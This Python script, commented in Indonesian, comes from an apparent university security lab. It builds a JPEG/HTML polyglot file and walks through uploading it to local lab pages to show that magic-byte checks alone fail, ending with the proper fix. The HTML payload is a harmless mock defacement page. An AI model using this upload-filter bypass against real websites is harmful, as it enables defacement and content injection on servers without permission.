"""
============================================================================
⚠️  SKRIP INI HANYA UNTUK EDUKASI DI LINGKUNGAN LAB LOKAL!
    Dilarang keras digunakan untuk menyerang server tanpa izin.
    Pelanggaran dapat dijerat UU ITE Pasal 30-33.
============================================================================

Deskripsi:
    Membuat file "polyglot" sederhana yang memiliki header JPEG valid
    (magic bytes FF D8 FF E0) diikuti oleh konten HTML tidak berbahaya.

Tujuan Edukasi:
    Menunjukkan kepada peserta pelatihan bahwa validasi file upload
    yang HANYA mengecek magic bytes (finfo / file command) BELUM CUKUP,
    karena file ini akan lolos pengecekan tersebut meskipun berisi HTML.

Cara Pakai:
    python generate_polyglot.py
    -> Menghasilkan file 'polyglot_demo.jpg' di folder yang sama.
    -> Upload file tersebut ke lab 15_File_Upload untuk pengujian.
"""

import os
import sys

# --- Konfigurasi ---
OUTPUT_DIR = os.path.dirname(os.path.abspath(__file__))
OUTPUT_FILE = os.path.join(OUTPUT_DIR, "polyglot_demo.jpg")

# Magic bytes standar JPEG/JFIF (4 byte pertama)
JPEG_MAGIC = bytes([
    0xFF, 0xD8, 0xFF, 0xE0,   # SOI + APP0 marker
    0x00, 0x10,                 # Panjang segmen APP0 (16 byte)
    0x4A, 0x46, 0x49, 0x46,    # "JFIF" dalam ASCII
    0x00,                       # Null terminator
    0x01, 0x01,                 # Versi JFIF 1.1
    0x00,                       # Aspek rasio: 0 = tanpa unit
    0x00, 0x01,                 # Densitas X = 1
    0x00, 0x01,                 # Densitas Y = 1
    0x00, 0x00,                 # Thumbnail 0x0
])

# Konten HTML edukatif (simulasi halaman deface sederhana)
HTML_PAYLOAD = b"""
<!-- ============================================================ -->
<!-- SIMULASI EDUKASI: Halaman ini BUKAN serangan sungguhan.       -->
<!-- Dibuat untuk pelatihan keamanan siber CYBERSHIELD 2026.       -->
<!-- ============================================================ -->
<html>
<head><title>Simulasi Defacement - CYBERSHIELD 2026</title></head>
<body style="margin:0; background:#0a0a0a; color:#0f0;
             font-family:monospace; display:flex; align-items:center;
             justify-content:center; min-height:100vh; text-align:center;">
    <div>
        <h1 style="font-size:3rem;">&#x1F480; HACKED BY XYZ &#x1F480;</h1>
        <p style="color:#888; font-size:1.2rem;">
            Website ini telah diretas karena tidak memvalidasi file upload
            dengan benar.
        </p>
        <hr style="border-color:#333;">
        <p style="color:#ef4444; font-size:0.9rem;">
            &#9888; INI HANYA SIMULASI EDUKASI &#9888;<br>
            Pelatihan Keamanan Siber - Universitas Pamulang
        </p>
    </div>
</body>
</html>
"""


def main():
    print("[*] CYBERSHIELD 2026 — Polyglot File Generator (Edukasi)")
    print("=" * 60)

    # Gabungkan magic bytes JPEG + konten HTML
    polyglot_data = JPEG_MAGIC + HTML_PAYLOAD

    # Tulis ke file
    with open(OUTPUT_FILE, "wb") as f:
        f.write(polyglot_data)

    file_size = os.path.getsize(OUTPUT_FILE)

    print(f"[+] File berhasil dibuat  : {OUTPUT_FILE}")
    print(f"[+] Ukuran file           : {file_size} bytes")
    print(f"[+] Magic bytes (hex)     : {JPEG_MAGIC[:4].hex().upper()}")
    print()
    print("[*] Pengujian yang bisa dilakukan:")
    print("    1. Jalankan: python -c \"import magic; print(magic.from_file(r'" + OUTPUT_FILE + "', mime=True))\"")
    print("       -> Hasilnya akan 'image/jpeg' (LOLOS validasi magic bytes!)")
    print()
    print("    2. Upload file ini ke http://localhost:8000/15_File_Upload/vuln.php")
    print("       -> Ubah Content-Type di Burp Suite menjadi image/jpeg")
    print("       -> File tersimpan dan bisa diakses sebagai HTML di browser")
    print()
    print("    3. Upload file ini ke http://localhost:8000/15_File_Upload/secure.php")
    print("       -> secure.php mengecek magic bytes via finfo()")
    print("       -> File akan LOLOS pengecekan finfo! (Ini menunjukkan bahwa")
    print("          magic bytes saja TIDAK CUKUP untuk keamanan)")
    print()
    print("[!] Solusi yang benar: Re-encode gambar dengan GD/ImageMagick,")
    print("    pisahkan storage, dan paksa Content-Type header saat serving.")


if __name__ == "__main__":
    main()
